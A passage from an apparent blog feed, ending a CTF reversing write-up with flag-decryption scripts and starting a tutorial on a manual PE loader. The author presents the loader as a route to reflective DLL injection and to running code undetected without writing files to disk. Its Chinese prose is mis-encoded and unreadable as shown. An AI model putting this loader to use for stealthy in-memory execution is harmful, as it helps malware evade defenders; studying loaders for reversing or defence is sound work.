class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    queue = [root]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        level = []</span><br><span class="line">        next_queue = []</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> queue:</span><br><span class="line">            level.append(node.val)</span><br><span class="line">            <span class="keyword">if</span> node.left:</span><br><span class="line">                next_queue.append(node.left)</span><br><span class="line">            <span class="keyword">if</span> node.right:</span><br><span class="line">                next_queue.append(node.right)</span><br><span class="line">        result.append(level)</span><br><span class="line">        queue = next_queue</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(item) <span class="keyword">for</span> sublist <span class="keyword">in</span> result <span class="keyword">for</span> item <span class="keyword">in</span> sublist])</span><br><span class="line"></span><br><span class="line">back = <span class="built_in">list</span>(<span class="string">&quot;j7aw_sC3addq4TAo&#125;8_Fda&#123;SD&quot;</span>)</span><br><span class="line">mide = <span class="built_in">list</span>(<span class="string">&quot;ja7Cws_A3daTd4qDo8&#125;F_Sd&#123;a&quot;</span>)</span><br><span class="line">root = buildTree(mide, back)</span><br><span class="line"></span><br><span class="line">level_order_result = levelOrder(root)</span><br><span class="line"><span class="built_in">print</span>(level_order_result)</span><br></pre></td></tr></table></figure><h2 id="zistel">zistel</h2><p>é€šè¿‡å­—ç¬¦ä¸²è¾“å‡ºæ‰¾åˆ°ä¸»å‡½æ•°</p><p><img src="https://s2.loli.net/2024/12/20/baHMl2z3ZKkLsVo.png" alt="image-20241220171522560"></p><p>æ‰¾åˆ°é€»è¾‘ï¼Œé€ä¸ªåˆ†æè°ƒè¯•</p><p>åŸºæœ¬åŠ å¯†é€»è¾‘æ˜¯</p><p><img src="https://s2.loli.net/2024/12/20/v8NKBsnZoVDzXCu.png" alt="image-20241220171837133"></p><p>å› æ­¤è¦æ‰¾åˆ°æ¯è½®é€šè¿‡100261Bç”Ÿæˆçš„xorNum</p><p>é€»è¾‘æ˜¯é€šè¿‡ä¸€ä¸ª256ä½æ›¿æ¢è¡¨è¿›è¡Œçš„æ›¿æ¢</p><p><img src="https://s2.loli.net/2024/12/20/f1noEMOhzrPUBCk.png" alt="image-20241220172004730"></p><p>å†™å‡ºè„šæœ¬ç›´æ¥é€†å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">thisKey</span><span class="params">(DWORD key, DWORD num)</span> </span>&#123;</span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i &amp; <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD xorData = key ^ num;</span><br><span class="line">PBYTE pxd = (PBYTE)&amp;xorData;</span><br><span class="line">PBYTE pky = (PBYTE)&amp;key;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD mid = pxd[i];</span><br><span class="line">DWORD x = S[pky[i]];</span><br><span class="line">pxd[i] = pxd[x];</span><br><span class="line">pxd[x] = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; std::hex &lt;&lt; xorData &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">return</span> key ^ xorData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc</span><span class="params">(DWORD* m, DWORD* key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; v0 = m[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">auto</span>&amp; v1 = m[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v1;</span><br><span class="line">v1 = v0 ^ <span class="built_in">thisKey</span>(key[i], v1);</span><br><span class="line">v0 = tmp;</span><br><span class="line">&#125;</span><br><span class="line">std::<span class="built_in">swap</span>(v0, v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dec</span><span class="params">(DWORD* c, DWORD* key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; v0 = c[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">auto</span>&amp; v1 = c[<span class="number">1</span>];</span><br><span class="line">std::<span class="built_in">swap</span>(v0, v1);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v0;</span><br><span class="line">v0 = v1 ^ <span class="built_in">thisKey</span>(key[i], v0);</span><br><span class="line">v1 = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD last[] = &#123;</span><br><span class="line"><span class="number">0x33293158</span>, <span class="number">0x60760211</span>, <span class="number">0x42185F46</span>, <span class="number">0x63746F29</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD key[] = &#123; <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span> &#125;;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line"><span class="built_in">dec</span>(&amp;last[<span class="number">2</span>], key);</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(last) &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//z1g_I3_S0_Coo0l!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
            <tag> zig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PEåŠ è½½å™¨å®ç°</title>
      <link href="/posts/29d83bc1.html"/>
      <url>/posts/29d83bc1.html</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æƒ³å­¦DLLåå°„æ³¨å…¥ï¼Œä½†æ˜¯å‘ç°è¦æ‰‹åŠ¨ç”Ÿæˆå†…å­˜çš„DLLæ–‡ä»¶ï¼Œæ‰€ä»¥å°±å…ˆå°è¯•å­¦PEåŠ è½½å™¨çš„å®ç°</p><p>è·Ÿç€ä½¬çš„åšå®¢å­¦çš„ï¼Œæ„Ÿè§‰è®²çš„å¾ˆè¯¦ç»†</p><p><a href="https://www.kn0sky.com/?p=37">æ‰‹å·¥æ¨¡æ‹ŸPEåŠ è½½å™¨ - æˆ‘å¯æ˜¯ä¼šé£çš„å•Š</a></p><hr><h2 id="æ¨¡æ‹ŸåŠ è½½PEæ–‡ä»¶">æ¨¡æ‹ŸåŠ è½½PEæ–‡ä»¶</h2><p>å°†DLLæˆ–è€…EXEæ–‡ä»¶æ‰‹åŠ¨åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œä¸æ˜¯ç”¨CreateProcessæˆ–è€…LoadLibraryå‡½æ•°æ¥æ“ä½œï¼Œé˜²æ­¢äº†éƒ¨åˆ†æ£€æµ‹æ‰‹æ®µï¼ŒåŒæ—¶å°†æ–‡ä»¶æ•°æ®åŠ å…¥åˆ°èµ„æºèŠ‚ä¸­å¯ä»¥å®ç°ä¸å°†å…¶è½åœ°å°±å¯ä»¥æ‰§è¡Œçš„æ•ˆæœï¼Œå‡å°‘äº†ç”Ÿæˆæ–‡ä»¶çš„æ£€æµ‹æ‰‹æ®µ</p><h2 id="åŸç†">åŸç†</h2><ul><li>å°†å¯¹åº”PEæ–‡ä»¶æŒ‰èŠ‚åŒºé¡ºåºä»æ–‡ä»¶ç»“æ„æ˜ å°„åˆ°æ˜ åƒå†…å­˜ç»“æ„æ”¾å…¥å†…å­˜</li><li>æ ¹æ®é‡å®šä½è¡¨ä¿®æ”¹ç¡¬ç¼–ç æ•°æ®æŒ‡ä»¤</li><li>ä»å¯¼å…¥è¡¨è·å–æ‰€éœ€å‡½æ•°ï¼Œä¿®æ­£å¯¼å…¥è¡¨å‡½æ•°åœ°å€(å¦‚æœæ˜¯ç›¸åŒè¿›ç¨‹ï¼Œå¯ä»¥ç”¨æœ¬è¿›ç¨‹çš„å¯¼å…¥è¡¨ç›´æ¥ä¿®æ”¹)</li><li>æ‰§è¡Œ/å¦‚æœæ˜¯DLLåˆ™æ˜¯ä¸»åŠ¨æ‰§è¡ŒDLLMain</li></ul><h2 id="é‡è¦ä¿¡æ¯">é‡è¦ä¿¡æ¯</h2><h3 id="æ˜ å°„PEå¤´">æ˜ å°„PEå¤´</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OptionalHeader.SizeOfHeaders<span class="comment">//è·å–PEå¤´å¤§å°</span></span><br></pre></td></tr></table></figure><h3 id="æ˜ å°„Section">æ˜ å°„Section</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_FIRST_SECTION(pedata.ntHeader)<span class="comment">//è·å–èŠ‚åŒºå¤´</span></span><br><span class="line">sectionHeader[i].PointerToRawData<span class="comment">//æ–‡ä»¶åç§»</span></span><br><span class="line">sectionHeader[i].VirtualAddress<span class="comment">//å†…å­˜åç§»</span></span><br><span class="line">sectionHeader[i].SizeOfRawData<span class="comment">//æ–‡ä»¶å¤§å°</span></span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤RelocTable">ä¿®å¤RelocTable</h3><p>é‡å®šä½è¡¨ç»“æ„ç±»ä¼¼</p><p><img src="https://s2.loli.net/2024/12/20/VoreMAq6SzYnwdg.png" alt="image-20241217021229993"></p><p>è™½ç„¶æ ‡å‡†è½½å…¥PE(exe)çš„æ—¶å€™æ˜¯ä¸éœ€è¦é‡å®šä½èŠ‚åŒºçš„ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯åœ¨åŠ è½½å™¨ç©ºé—´åˆ›å»ºå†…å­˜ï¼Œæ‰€ä»¥ä¾ç„¶éœ€è¦ä¿®å¤é‡å®šä½è¡¨ã€‚</p><p>é‡å®šä½è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>TypeOffsetæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªåç§»å€¼è¯´æ˜è¿™ä¸€ä¸ªVirtualAddressæ®µæœ‰å“ªäº›éœ€è¦é‡å®šä½çš„åœ°å€ã€‚SizeOfBlockåŒ…å«äº†æ•´ä¸ªç»“æ„çš„å¤§å°å’ŒTypeOffsetçš„å¤§å°</p><p>Blockä¸­TypeOffestä¸ºä¸€ä¸ªå­—ï¼Œé«˜4ä½è¡¨ç¤ºç±»å‹ï¼Œ3è¡¨ç¤ºx86ï¼ŒAè¡¨ç¤ºx64ï¼Œä½12ä½è¡¨ç¤ºåç§»é‡<br>é»˜è®¤å†…å­˜åç§»é‡ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memBase + VirtualAddress + TypeOffest&amp;<span class="number">0xfff</span></span><br></pre></td></tr></table></figure><p>å½“å‰å†…å­˜åç§»é‡ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newMemBase + VirtualAddress + TypeOffest&amp;<span class="number">0xfff</span></span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤IAT">ä¿®å¤IAT</h3><p>IATè¡¨æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªå¦‚ä¸‹ç»“æ„ä½“IIDï¼Œæ¯ä¸ªç»“æ„ä½“å¯¹åº”ä¸€ä¸ªDLL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“ä¸­ï¼ŒNameå­—æ®µæ ‡è¯†äº†DLLåç§°çš„RVA</p><p>FirstThunkæ˜¯æœ€åçš„å¯¼å…¥åœ°å€è¡¨æŒ‡é’ˆï¼Œæœ€åéœ€è¦æŠŠæ¯ä¸ªå¯¼å…¥çš„å‡½æ•°çš„çœŸå®åœ°å€å¡«å…¥åˆ°è¿™é‡ŒæŒ‡å‘çš„ä½ç½®</p><p>DUMMYUNIONNAMEä¸­ï¼Œä¸€èˆ¬ç±»å‹æ˜¯OriginalFirstThunkï¼Œå¦‚æœæ˜¯Characteristicsï¼Œå°±è¡¨ç¤ºç»“æŸï¼ˆ0ï¼‰<br>OriginalFirstThunkå’Œå¯¼å…¥å‡½æ•°çš„åç§°æˆ–è€…åºå·æœ‰å…³</p><p>OriginalFirstThunkå’ŒFirstThunkæŒ‡å‘äº†IMAGE_THUNK_DATAç»“æ„ä½“çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA64</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONGLONG ForwarderString;  <span class="comment">// PBYTE </span></span><br><span class="line">        ULONGLONG Function;         <span class="comment">// PDWORD</span></span><br><span class="line">        ULONGLONG Ordinal;</span><br><span class="line">        ULONGLONG AddressOfData;    <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA64;</span><br></pre></td></tr></table></figure><p>å…·ä½“ç»“æ„å¦‚ä¸Šï¼Œå…¶ä¸­AddressOfDataæ˜¯æŒ‡å‘IMAGE_IMPORT_BY_NAMEçš„ç»“æ„ä½“ï¼Œå…·ä½“ç»“æ„å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>å¦‚æœæŒ‡å‘çš„æ˜¯<code>å¯¼å…¥åç§°è¡¨</code>ï¼Œé‚£ä¹ˆu1æ˜¯AddressOfDataï¼Œ<br>å¦‚æœæ˜¯<code>å¯¼å…¥åœ°å€è¡¨</code>ï¼Œåˆ†ä¸ºä¸¤ç§æƒ…å†µ<br>è‹¥æ˜¯åºå·å¯¼å…¥ï¼Œu1æ˜¯Ordinalï¼Œé¦–ä½ä¸º1ï¼Œä½4ä½æ˜¯å¯¼å…¥åºå·<br>è‹¥æ˜¯åç§°å¯¼å…¥ï¼Œu1æ˜¯Functionï¼Œç›®æ ‡å¯¼å…¥åœ°å€</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åŒæ—¶éå†ä¸¤ä¸ªè¡¨è¿›è¡Œèµ‹å€¼</p><h2 id="ä»£ç ">ä»£ç </h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PEdata</span> &#123;</span><br><span class="line">PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader;</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å†…å­˜æ˜ åƒæ•´å¤§å°</span></span><br><span class="line"><span class="type">size_t</span> memSize;</span><br><span class="line"><span class="comment">//PEå¤´æ˜ åƒå¤§å°</span></span><br><span class="line"><span class="type">size_t</span> memHeaderSize;</span><br><span class="line"><span class="comment">//èŠ‚åŒºæ˜ åƒå¤§å°</span></span><br><span class="line"><span class="type">size_t</span> sectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å†…å­˜èµ·å§‹åœ°å€</span></span><br><span class="line">DWORD64 imageBase;</span><br><span class="line">&#125;pedata;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">loadPEstruct</span><span class="params">(BYTE* rawdata)</span> </span>&#123;</span><br><span class="line">pedata.dosHeader = (PIMAGE_DOS_HEADER)rawdata;</span><br><span class="line">pedata.ntHeader = (PIMAGE_NT_HEADERS)(rawdata + pedata.dosHeader-&gt;e_lfanew);</span><br><span class="line">pedata.fileHeader = &amp;(pedata.ntHeader-&gt;FileHeader);</span><br><span class="line">pedata.optionalHeader = &amp;(pedata.ntHeader-&gt;OptionalHeader);</span><br><span class="line"></span><br><span class="line">pedata.imageBase = pedata.optionalHeader-&gt;ImageBase;</span><br><span class="line">pedata.memSize = pedata.optionalHeader-&gt;SizeOfImage;</span><br><span class="line">pedata.memHeaderSize = pedata.optionalHeader-&gt;SizeOfHeaders;</span><br><span class="line">pedata.sectionAlignment = pedata.optionalHeader-&gt;SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">mapToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="type">errno_t</span> err = <span class="built_in">fopen_s</span>(&amp;file, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">size_t</span> fileSize = <span class="built_in">ftell</span>(file);</span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">fileData</span><span class="params">(<span class="keyword">new</span> BYTE[fileSize])</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!fileData) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(fileData.<span class="built_in">get</span>(), <span class="number">1</span>, fileSize, file);</span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æˆåŠŸç”³è¯·å†…å­˜: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(fileData.<span class="built_in">get</span>()));</span><br><span class="line"><span class="keyword">return</span> fileData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">makeHeadandSectionMap</span><span class="params">(LPVOID memBase, <span class="type">const</span> BYTE* fileBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------å¼€å§‹æ˜ å°„èŠ‚åŒº--------\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(memBase, fileBase, pedata.memHeaderSize);</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER 